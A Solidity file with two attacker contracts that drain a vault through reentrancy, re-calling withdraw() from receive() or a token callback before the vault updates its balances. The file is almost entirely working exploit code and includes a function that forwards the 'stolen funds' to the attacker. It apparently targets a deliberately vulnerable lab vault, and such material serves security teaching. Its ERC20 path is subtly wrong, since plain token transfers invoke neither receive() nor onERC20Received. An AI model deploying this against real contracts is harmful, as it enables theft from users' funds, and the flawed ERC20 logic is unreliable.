// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface IVulnerableVault {
    function deposit(uint256 assets, address receiver) external returns (uint256);
    function withdraw(uint256 assets, address receiver, address owner) external;
    function balanceOfAssets(address account) external view returns (uint256);
}

/**
 * @title ReentrancyAttacker
 * @notice Demonstrates a reentrancy attack on PausableVulnerableVault
 * @dev This contract exploits the missing reentrancy guard in withdraw()
 * 
 * Attack flow:
 * 1. Deposit ETH into vault
 * 2. Call withdraw()
 * 3. receive() callback triggers reentrant withdraw()
 * 4. State not yet updated, so we can withdraw again
 * 5. Repeat until vault is drained
 */

contract ReentrancyAttacker {
    
    IVulnerableVault public immutable vault;
    IERC20 public immutable asset;
    address public owner;
    
    uint256 public attackCount;
    uint256 public constant MAX_REENTRANCY = 10;
    uint256 public drainedAmount;
    
    // Attack states
    enum AttackState { IDLE, ATTACKING }
    AttackState public state;
    
    event AttackStarted(uint256 initialDeposit);
    event ReentrancyTriggered(uint256 count, uint256 amount);
    event AttackComplete(uint256 totalDrained);
    event FundsRecovered(uint256 amount);
    
    modifier onlyOwner() {
        require(msg.sender == owner, "Not owner");
        _;
    }
    
    constructor(address _vault, address _asset) {
        vault = IVulnerableVault(_vault);
        asset = IERC20(_asset);
        owner = msg.sender;
    }
    
    /**
     * @notice Execute the reentrancy attack
     * @param depositAmount Amount to deposit (and attempt to drain)
     */
    function attack(uint256 depositAmount) external onlyOwner {
        require(state == AttackState.IDLE, "Attack in progress");
        require(depositAmount > 0, "Zero amount");
        
        state = AttackState.ATTACKING;
        attackCount = 0;
        drainedAmount = 0;
        
        emit AttackStarted(depositAmount);
        
        // Step 1: Approve and deposit
        asset.approve(address(vault), depositAmount);
        vault.deposit(depositAmount, address(this));
        
        // Step 2: Trigger the vulnerable withdraw
        // This will call back into receive() before state update
        uint256 balanceBefore = asset.balanceOf(address(this));
        vault.withdraw(depositAmount, address(this), address(this));
        uint256 balanceAfter = asset.balanceOf(address(this));
        
        drainedAmount = balanceAfter - balanceBefore;
        state = AttackState.IDLE;
        
        emit AttackComplete(drainedAmount);
    }
    
    /**
     * @notice Receive callback - this is where the magic happens
     * @dev This is called during the external transfer in withdraw()
     * BEFORE the vault updates its state, allowing reentrancy
     */
    receive() external payable {
        if (state == AttackState.ATTACKING && attackCount < MAX_REENTRANCY) {
            attackCount++;
            
            // Try to withdraw again - vault hasn't updated state yet!
            uint256 vaultBalance = vault.balanceOfAssets(address(this));
            
            if (vaultBalance > 0) {
                emit ReentrancyTriggered(attackCount, vaultBalance);
                
                // Reentrant call - this will succeed because state hasn't been updated
                try vault.withdraw(vaultBalance, address(this), address(this)) {
                    // Success - drained more funds
                } catch {
                    // Attack failed this iteration
                }
            }
        }
    }
    
    /**
     * @notice Alternative attack using ERC20 tokens
     */
    function onERC20Received(address, uint256 amount) external returns (bytes4) {
        if (state == AttackState.ATTACKING && attackCount < MAX_REENTRANCY) {
            attackCount++;
            
            uint256 vaultBalance = vault.balanceOfAssets(address(this));
            if (vaultBalance > 0) {
                emit ReentrancyTriggered(attackCount, vaultBalance);
                vault.withdraw(vaultBalance, address(this), address(this));
            }
        }
        return this.onERC20Received.selector;
    }
    
    /**
     * @notice Recover stolen funds to attacker owner
     */
    function recoverFunds() external onlyOwner {
        uint256 balance = asset.balanceOf(address(this));
        require(balance > 0, "No funds");
        
        asset.transfer(owner, balance);
        emit FundsRecovered(balance);
    }
    
    /**
     * @notice Check if attack was profitable
     */
    function isProfitable() external view returns (bool) {
        return drainedAmount > 0;
    }
    
    /**
     * @notice Get attack summary
     */
    function getAttackSummary() external view returns (
        uint256 timesReentered,
        uint256 totalDrained,
        uint256 currentBalance,
        bool wasProfitable
    ) {
        return (
            attackCount,
            drainedAmount,
            asset.balanceOf(address(this)),
            drainedAmount > 0
        );
    }
}

/**
 * @title ReentrancyAttackerETH
 * @notice Variation for ETH-based vaults (using WETH or native ETH)
 */
contract ReentrancyAttackerETH {
    
    IVulnerableVault public immutable vault;
    address public owner;
    
    uint256 public attackCount;
    uint256 public constant MAX_REENTRANCY = 10;
    uint256 public initialDeposit;
    
    bool public attacking;
    
    event AttackStarted(uint256 deposit);
    event Reentrancy(uint256 count, uint256 amount);
    event AttackFinished(uint256 drained);
    
    modifier onlyOwner() {
        require(msg.sender == owner, "Not owner");
        _;
    }
    
    constructor(address _vault) {
        vault = IVulnerableVault(_vault);
        owner = msg.sender;
    }
    
    function attack() external payable onlyOwner {
        require(!attacking, "Already attacking");
        require(msg.value > 0, "Need ETH");
        
        attacking = true;
        initialDeposit = msg.value;
        attackCount = 0;
        
        emit AttackStarted(msg.value);
        
        // Deposit
        (bool depositSuccess,) = address(vault).call{value: msg.value}(
            abi.encodeWithSelector(vault.deposit.selector, msg.value, address(this))
        );
        require(depositSuccess, "Deposit failed");
        
        // Trigger withdraw (will call receive)
        vault.withdraw(msg.value, address(this), address(this));
        
        attacking = false;
        
        emit AttackFinished(address(this).balance);
    }
    
    receive() external payable {
        if (attacking && attackCount < MAX_REENTRANCY) {
            attackCount++;
            
            uint256 balance = vault.balanceOfAssets(address(this));
            if (balance > 0) {
                emit Reentrancy(attackCount, balance);
                
                // Reentrant withdraw
                (bool success,) = address(vault).call(
                    abi.encodeWithSelector(vault.withdraw.selector, balance, address(this), address(this))
                );
                
                // Continue regardless of success
                (success); // Silence warning
            }
        }
    }
    
    function withdraw() external onlyOwner {
        uint256 balance = address(this).balance;
        require(balance > 0, "No balance");
        
        (bool success,) = owner.call{value: balance}("");
        require(success, "Transfer failed");
    }
    
    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}
